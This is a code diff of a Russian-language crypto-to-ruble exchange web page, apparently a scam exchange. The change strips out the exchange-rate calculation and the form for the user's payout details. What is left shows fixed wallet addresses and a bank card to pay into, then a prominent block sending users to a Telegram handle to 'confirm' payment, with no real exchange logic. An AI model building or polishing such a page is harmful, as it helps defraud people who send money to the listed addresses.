@@ -261,13 +261,6 @@ input::placeholder { color: #5e6673; font-weight: 400; }
 }
 .btn:hover::before { left: 100%; }
 
-.btn-green {
-  background: linear-gradient(135deg, var(--green) 0%, var(--green-light) 50%, var(--green) 100%);
-  background-size: 200% auto; color: #0b0e11; margin-top: 18px;
-  box-shadow: 0 10px 30px rgba(14,203,129,0.3), inset 0 1px 0 rgba(255,255,255,0.3);
-}
-.btn-green:hover { box-shadow: 0 15px 40px rgba(14,203,129,0.5), inset 0 1px 0 rgba(255,255,255,0.4); }
-
 .result {
   display: none; margin-top: 28px;
   background: linear-gradient(150deg, rgba(15,19,24,0.95), rgba(8,11,15,0.98));
@@ -300,23 +293,54 @@ input::placeholder { color: #5e6673; font-weight: 400; }
   border-radius: 10px; border-left: 3px solid var(--red);
   font-weight: 500; line-height: 1.5;
 }
-.success-msg {
-  display: none; margin-top: 24px;
-  background: linear-gradient(135deg, var(--green), var(--green-light));
-  color: #0b0e11; padding: 20px; border-radius: 14px;
-  font-size: 14px; font-weight: 700;
-  animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1), glowGreen 2s ease-in-out infinite;
-  position: relative; z-index: 1; text-align: center; line-height: 1.5;
+
+/* ===== СООБЩЕНИЕ С НИКОМ ПОДДЕРЖКИ ===== */
+.support-block {
+  display: none;
+  margin-top: 28px;
+  background: linear-gradient(135deg, rgba(240,185,11,0.15), rgba(240,185,11,0.05));
+  border: 2px solid var(--gold);
+  border-radius: 18px;
+  padding: 32px 24px;
+  text-align: center;
+  animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1), glowGold 2.5s ease-in-out infinite;
+  position: relative; z-index: 1;
+  box-shadow: 0 0 40px rgba(240,185,11,0.3);
 }
-.success-msg.show { display: block; }
-@keyframes glowGreen {
-  0%, 100% { box-shadow: 0 0 30px rgba(14,203,129,0.5); }
-  50% { box-shadow: 0 0 60px rgba(14,203,129,0.9); }
+.support-block.show { display: block; }
+@keyframes glowGold {
+  0%, 100% { box-shadow: 0 0 40px rgba(240,185,11,0.3); border-color: var(--gold); }
+  50% { box-shadow: 0 0 70px rgba(240,185,11,0.6); border-color: var(--gold-light); }
 }
-.success-msg b {
-  color: #0b0e11; background: rgba(255,255,255,0.3);
-  padding: 3px 8px; border-radius: 6px;
+.support-block .support-title {
   font-family: 'Manrope', sans-serif;
+  font-size: 16px;
+  color: var(--text-mid);
+  text-transform: uppercase;
+  letter-spacing: 3px;
+  margin-bottom: 16px;
+  font-weight: 600;
+}
+.support-block .support-nick {
+  font-family: 'Manrope', sans-serif;
+  font-size: 32px;
+  font-weight: 900;
+  background: linear-gradient(135deg, #ffffff, var(--gold-light), var(--gold));
+  background-size: 200% auto;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  animation: shine 3s linear infinite;
+  letter-spacing: 1px;
+  display: block;
+  margin: 8px 0;
+  text-shadow: 0 0 40px rgba(240,185,11,0.6);
+}
+.support-block .support-sub {
+  font-size: 13px;
+  color: var(--text-dim);
+  margin-top: 16px;
+  line-height: 1.5;
 }
 
 footer {
@@ -338,6 +362,7 @@ footer {
   .btn { font-size: 15px; padding: 16px; }
   .rate-info { font-size: 12px; padding: 14px 16px; flex-direction: column; gap: 8px; align-items: flex-start; }
   .tab { padding: 12px 14px; font-size: 13px; }
+  .support-block .support-nick { font-size: 26px; }
 }
 </style>
 </head>
@@ -370,7 +395,7 @@ footer {
     <span>Все системы работают. Онлайн-обмен доступен 24/7.</span>
   </div>
 
-  <!-- ФОРМА -->
+  <!-- ФОРМА ОБМЕНА -->
   <div id="exchangeForm">
     <div class="form-group">
       <label>Отдаю</label>
@@ -401,58 +426,14 @@ footer {
   <div class="result" id="result">
     <p>✅ Заявка создана. Переведите <b id="payAmount" style="color:#f0b90b;">0</b> <span id="payCur">TON</span>:</p>
     <div class="addr" id="walletAddr" onclick="copyAddr()">UQCdkAxf20UIMaboXOfSpmNTkFSVguTVHIw2PMSOhEkF6SuH</div>
-    <p id="payInstruction">После перевода нажмите кнопку ниже:</p>
-    <button class="btn btn-green" onclick="showPaymentForm()">✅ Я оплатил</button>
-    <p class="warning">⚠️ Внимание: переводы с санкционных бирж запрещены.</p>
+    <p id="payInstruction">После перевода свяжитесь с поддержкой:</p>
   </div>
 
-  <!-- ФОРМА РЕКВИЗИТОВ (МЕНЯЕТСЯ В ЗАВИСИМОСТИ ОТ НАПРАВЛЕНИЯ) -->
-  <div class="result" id="paymentForm" style="display:none;">
-    <p id="formTitle" style="margin-bottom: 20px; font-weight: 600;">📝 Заполните данные для получения:</p>
-    
-    <div class="form-group">
-      <label>Ваше имя</label>
-      <input type="text" id="userName" placeholder="Иван Иванов">
-    </div>
-
-    <!-- БЛОК ДЛЯ КРИПТА → ФИАТ (получает рубли) -->
-    <div id="fiatRequisites" style="display:none;">
-      <div class="form-group">
-        <label>Номер карты или телефон (СБП)</label>
-        <input type="text" id="userCard" placeholder="2200 0000 0000 0000">
-      </div>
-      <div class="form-group">
-        <label>Банк</label>
-        <input type="text" id="userBank" placeholder="Сбербанк / Тинькофф / Альфа">
-      </div>
-      <div class="form-group">
-        <label>Сумма к получению (RUB)</label>
-        <input type="text" id="userAmount" placeholder="250 000">
-      </div>
-    </div>
-
-    <!-- БЛОК ДЛЯ ФИАТ → КРИПТА (получает крипту) -->
-    <div id="cryptoRequisites" style="display:none;">
-      <div class="form-group">
-        <label>Ваш крипто-кошелёк (куда отправить крипту)</label>
-        <input type="text" id="userWallet" placeholder="UQ... / T... / 0x...">
-      </div>
-      <div class="form-group">
-        <label>Сеть / Валюта</label>
-        <input type="text" id="userNetwork" placeholder="TON / TRC20 / ERC20">
-      </div>
-      <div class="form-group">
-        <label>Сумма к получению (в крипте)</label>
-        <input type="text" id="userCryptoAmount" placeholder="4.0 TON">
-      </div>
-    </div>
-
-    <button class="btn btn-green" onclick="submitPayment()">Отправить заявку</button>
-  </div>
-
-  <!-- СООБЩЕНИЕ УСПЕХА -->
-  <div class="success-msg" id="successMsg">
-    ✅ Заявка принята! Для ускорения обработки напишите в поддержку: <b>@Frycrycry</b>
+  <!-- БОЛЬШОЙ БЛОК С НИКОМ ПОДДЕРЖКИ -->
+  <div class="support-block" id="supportBlock">
+    <div class="support-title">Пишите в поддержку</div>
+    <span class="support-nick">@Frycrycry</span>
+    <div class="support-sub">Отправьте чек об оплате и укажите куда выводить средства</div>
   </div>
 
 </div>
@@ -478,15 +459,14 @@ for (let i = 0; i < 40; i++) {
   particlesContainer.appendChild(p);
 }
 
-// ===== АДРЕСА И РЕКВИЗИТЫ =====
+// ===== АДРЕСА =====
 const WALLETS = {
   TON:  "UQCdkAxf20UIMaboXOfSpmNTkFSVguTVHIw2PMSOhEkF6SuH",
   USDT: "TT4FuAXpXQjVXYqXuXojbhedYsW3WwZQq1",
   ETH:  "0xe16aea126c8Aa4B97eeD2BEf4315956E1840373B"
 };
 
-// КАРТА ДЛЯ ПРИЁМА РУБЛЕЙ (когда Фиат → Крипта)
-const MY_CARD = "2200 0000 0000 0000"; // ЗАМЕНИ НА СВОЮ
+const MY_CARD = "2200 0000 0000 0000";
 const MY_BANK = "Сбербанк";
 const SUPPORT = "@Frycrycry";
 
@@ -537,10 +517,8 @@ function setDirection(dir, btn) {
   document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
   btn.classList.add('active');
   fillSelects();
-  // Скрываем прошлые результаты
   document.getElementById('result').classList.remove('show');
-  document.getElementById('paymentForm').style.display = 'none';
-  document.getElementById('successMsg').classList.remove('show');
+  document.getElementById('supportBlock').classList.remove('show');
 }
 
 function swapCurrencies() {
@@ -575,8 +553,6 @@ function calculate() {
   const from = document.getElementById('fromCurrency').value;
   const to = document.getElementById('toCurrency').value;
   const amount = parseFloat(document.getElementById('amount').value) || 0;
-  const rate = getRate(from, to);
-  const result = amount * rate;
 
   document.getElementById('payAmount').innerText = amount.toFixed(2);
   document.getElementById('payCur').innerText = from;
@@ -584,64 +560,20 @@ function calculate() {
   const isCryptoFrom = !!WALLETS[from];
 
   if (isCryptoFrom) {
-    // КРИПТА → ФИАТ: показываем адрес кошелька для отправки крипты
+    // КРИПТА → ФИАТ: показываем адрес кошелька
     document.getElementById('walletAddr').innerText = WALLETS[from];
     document.getElementById('walletAddr').style.display = 'block';
-    document.getElementById('payInstruction').innerText = `После перевода ${from} нажмите кнопку ниже:`;
+    document.getElementById('payInstruction').innerText = `После перевода ${from} свяжитесь с поддержкой:`;
   } else {
-    // ФИАТ → КРИПТА: показываем реквизиты для оплаты рублями
+    // ФИАТ → КРИПТА: показываем реквизиты карты
     document.getElementById('walletAddr').innerText = `💳 Переведите ${amount.toFixed(2)} ${from} на карту: ${MY_CARD} (${MY_BANK})`;
     document.getElementById('walletAddr').style.display = 'block';
-    document.getElementById('payInstruction').innerText = `После перевода напишите в поддержку ${SUPPORT} для подтверждения:`;
+    document.getElementById('payInstruction').innerText = `После перевода свяжитесь с поддержкой:`;
   }
 
   document.getElementById('result').classList.add('show');
+  document.getElementById('supportBlock').classList.add('show');
   document.getElementById('result').scrollIntoView({ behavior: 'smooth', block: 'center' });
-}
-
-function showPaymentForm() {
-  const from = document.getElementById('fromCurrency').value;
-  const isCryptoFrom = !!WALLETS[from];
-
-  if (isCryptoFrom) {
-    // КРИПТА → ФИАТ: форма для получения рублей
-    document.getElementById('formTitle').innerText = '📝 Данные для получения рублей:';
-    document.getElementById('fiatRequisites').style.display = 'block';
-    document.getElementById('cryptoRequisites').style.display = 'none';
-  } else {
-    // ФИАТ → КРИПТА: форма для получения крипты
-    document.getElementById('formTitle').innerText = '📝 Данные для получения крипты:';
-    document.getElementById('fiatRequisites').style.display = 'none';
-    document.getElementById('cryptoRequisites').style.display = 'block';
-  }
-
-  document.getElementById('paymentForm').style.display = 'block';
-  document.getElementById('paymentForm').scrollIntoView({ behavior: 'smooth', block: 'center' });
-}
-
-function submitPayment() {
-  const from = document.getElementById('fromCurrency').value;
-  const isCryptoFrom = !!WALLETS[from];
-
-  const name = document.getElementById('userName').value;
-  if (!name) { alert('Заполните имя!'); return; }
-
-  if (isCryptoFrom) {
-    // КРИПТА → ФИАТ
-    const card = document.getElementById('userCard').value;
-    const bank = document.getElementById('userBank').value;
-    const amount = document.getElementById('userAmount').value;
-    if (!card || !bank || !amount) { alert('Заполните все поля!'); return; }
-  } else {
-    // ФИАТ → КРИПТА
-    const wallet = document.getElementById('userWallet').value;
-    const network = document.getElementById('userNetwork').value;
-    const amount = document.getElementById('userCryptoAmount').value;
-    if (!wallet || !network || !amount) { alert('Заполните все поля!'); return; }
-  }
-
-  document.getElementById('successMsg').classList.add('show');
-  document.getElementById('successMsg').scrollIntoView({ behavior: 'smooth', block: 'center' });
 }
 
 function copyAddr() {
@@ -660,4 +592,4 @@ function copyAddr() {
 }
 </script>
 </body>
-  </html>
+</html>
